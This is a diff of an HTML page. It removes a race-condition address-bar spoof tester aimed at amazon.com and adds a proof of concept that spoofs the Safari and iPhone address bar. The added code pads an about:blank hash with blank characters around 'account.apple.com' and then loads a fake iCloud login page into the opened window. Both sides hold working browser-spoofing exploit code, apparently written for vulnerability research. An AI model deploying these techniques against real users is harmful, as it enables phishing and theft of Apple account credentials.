@@ -1,243 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      padding: 20px;
-      background: #f5f5f5;
-    }
-    
-    .container {
-      max-width: 600px;
-      margin: 0 auto;
-      background: white;
-      padding: 30px;
-      border-radius: 8px;
-      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-    }
-    
-    .spoof-button {
-      background: #ff4444;
-      color: white;
-      padding: 15px 30px;
-      border: none;
-      border-radius: 5px;
-      font-size: 16px;
-      cursor: pointer;
-      text-decoration: none;
-      display: inline-block;
-    }
-    
-    .spoof-button:hover {
-      background: #cc0000;
-    }
-    
-    .stats {
-      margin-top: 30px;
-      padding: 20px;
-      background: #f9f9f9;
-      border-radius: 5px;
-      border-left: 4px solid #ff4444;
-    }
-    
-    .counter {
-      font-size: 48px;
-      font-weight: bold;
-      color: #ff4444;
-      margin: 10px 0;
-      font-family: 'Courier New', monospace;
-    }
-    
-    .label {
-      font-size: 14px;
-      color: #666;
-      margin-bottom: 5px;
-    }
-    
-    .status {
-      margin-top: 15px;
-      padding: 10px;
-      border-radius: 5px;
-      font-weight: bold;
-    }
-    
-    .status.running {
-      background: #fff3cd;
-      color: #856404;
-    }
-    
-    .status.stopped {
-      background: #d4edda;
-      color: #155724;
-    }
-    
-    .status.vulnerable {
-      background: #f8d7da;
-      color: #721c24;
-    }
-    
-    .progress-bar {
-      width: 100%;
-      height: 30px;
-      background: #e0e0e0;
-      border-radius: 15px;
-      overflow: hidden;
-      margin: 15px 0;
-    }
-    
-    .progress-fill {
-      height: 100%;
-      background: linear-gradient(90deg, #ff4444, #cc0000);
-      width: 0%;
-      transition: width 0.1s;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      color: white;
-      font-size: 12px;
-      font-weight: bold;
-    }
-    
-    .info-box {
-      margin-top: 20px;
-      padding: 15px;
-      background: #e7f3ff;
-      border-left: 4px solid #2196F3;
-      border-radius: 5px;
-    }
-    
-    .info-box h3 {
-      margin-top: 0;
-      color: #1976D2;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+    <script>
+        function poc() {
+//Open new window with about:blank and a hash which contains many whitespaces and in the middle the site address we want to spoof
+
+// Safari Mac Payload
+url='about:blank#\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800account.apple.com\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800';
+
+//iPhone Payload
+if(location.href.includes('ios'))
+url='about:blank#\u2800\u2800\u2800\u2800\u2800\u2800\u2800account.apple.com\u2800\u2800\u2800\u2800\u2800';
+
+v= window.open(url);
+
+// Wait a little and change contents of the newly created tab to a fake login iCloud page as a POC
+setTimeout(()=>{
+fetch('/fakeapple.html').then(r => r.text()).then(h => v.document.body.innerHTML = h).then(() => Array.from(v.document.scripts).forEach(s => v.eval(s.text)));
+},100);
+        }
+    </script>
+   <style>
+body{margin:0;padding:0;display:flex;justify-content:center;align-items:center;height:100vh;background-color:#f5f5f7;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,'Helvetica Neue',Arial,sans-serif}
+.container{display:none;text-align:center;padding:20px;background-color:#fff;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.1)}
+button{background-color:#4285f4;color:white;border:none;padding:12px;font-size:16px;cursor:pointer;transition:background-color 0.3s}
+    </style>
 </head>
 <body>
-  <div class="container">
-    <h1>Race Condition Spoof Detector</h1>
-    <p>Klik tombol di bawah untuk memulai race condition attack dan melihat berapa percobaan yang dibutuhkan.</p>
-    
-    <a href="javascript:void(0);" class="spoof-button" onclick="startSpoof()">🚀 Start Spoof Attack</a>
-    
-    <div class="stats">
-      <div class="label">Percobaan Race Condition:</div>
-      <div class="counter" id="attemptCounter">0</div>
-      
-      <div class="progress-bar">
-        <div class="progress-fill" id="progressBar">0%</div>
-      </div>
-      
-      <div class="label">Status:</div>
-      <div class="status" id="status">Menunggu...</div>
-      
-      <div class="info-box">
-        <h3>📊 Statistik</h3>
-        <div id="stats">
-          <p><strong>Max Percobaan:</strong> 100</p>
-          <p><strong>Interval:</strong> ~0ms (maksimum kecepatan)</p>
-          <p><strong>Target:</strong> amazon.com:8080</p>
-        </div>
-      </div>
+
+    <div id="landing" >
+   <img width=300 src=https://docs-assets.developer.apple.com/published/975306cce017e397fdad44f47f8b98c3/apple-id-black-no@2x.png onclick=poc()>
     </div>
-  </div>
-    
-  <script>
-    let windowSpoof;
-    let raceInterval;
-    let attemptCount = 0;
-    let startTime = 0;
-    const maxAttempts = 100;
-    
-    function updateUI() {
-      const counterElement = document.getElementById('attemptCounter');
-      const progressBar = document.getElementById('progressBar');
-      const statusElement = document.getElementById('status');
-      
-      // Update counter
-      counterElement.textContent = attemptCount;
-      
-      // Update progress bar
-      const percentage = (attemptCount / maxAttempts) * 100;
-      progressBar.style.width = percentage + '%';
-      progressBar.textContent = Math.round(percentage) + '%';
-      
-      // Update status
-      if (attemptCount < maxAttempts) {
-        statusElement.className = 'status running';
-        statusElement.textContent = '⚡ Race condition sedang berjalan...';
-      }
-    }
-    
-    function race() {
-      attemptCount++;
-      updateUI();
-      
-      try {
-        windowSpoof.location.href !== 'about:blank';
-      }
-      catch (e) {
-        try {
-          windowSpoof.location.href = 'https://www.google.com/csi';
-        } catch (err) {
-          // Kemungkinan spoof berhasil
-          const statusElement = document.getElementById('status');
-          statusElement.className = 'status vulnerable';
-          statusElement.innerHTML = '🔓 <strong>VULNERABLE!</strong> Spoof kemungkinan berhasil pada percobaan ke-' + attemptCount;
-          stopSpoof(true);
-          return;
-        }
-      }
-      
-      // Stop setelah 100 percobaan
-      if (attemptCount >= maxAttempts) {
-        stopSpoof(false);
-      }
-    }
-    
-    function stopSpoof(isVulnerable) {
-      if (raceInterval) {
-        clearInterval(raceInterval);
-        raceInterval = null;
-      }
-      
-      const endTime = Date.now();
-      const duration = ((endTime - startTime) / 1000).toFixed(2);
-      const statusElement = document.getElementById('status');
-      
-      if (!isVulnerable) {
-        statusElement.className = 'status stopped';
-        statusElement.innerHTML = '✅ Race condition selesai<br>' +
-                                  '<small>Total: ' + attemptCount + ' percobaan dalam ' + duration + ' detik</small>';
-      } else {
-        statusElement.innerHTML += '<br><small>Waktu: ' + duration + ' detik</small>';
-      }
-      
-      console.log('Race condition stopped after', attemptCount, 'attempts in', duration, 'seconds');
-    }
-    
-    function startSpoof() {
-      // Reset
-      attemptCount = 0;
-      startTime = Date.now();
-      
-      const statusElement = document.getElementById('status');
-      statusElement.className = 'status running';
-      statusElement.textContent = '🚀 Memulai attack...';
-      
-      updateUI();
-      
-      // Open window and start race
-      windowSpoof = window.open("https://www.google.com:82", "x");
-      
-      if (!windowSpoof) {
-        statusElement.className = 'status stopped';
-        statusElement.textContent = '❌ Popup diblokir! Izinkan popup untuk melanjutkan.';
-        return;
-      }
-      
-      windowSpoof.document.write("<h2>Your address bar has been spoofed. This is not https://www.amazon.com/</h2>");
-      
-      raceInterval = setInterval(race, 0);
-    }
-  </script>
+
 </body>
+</html>
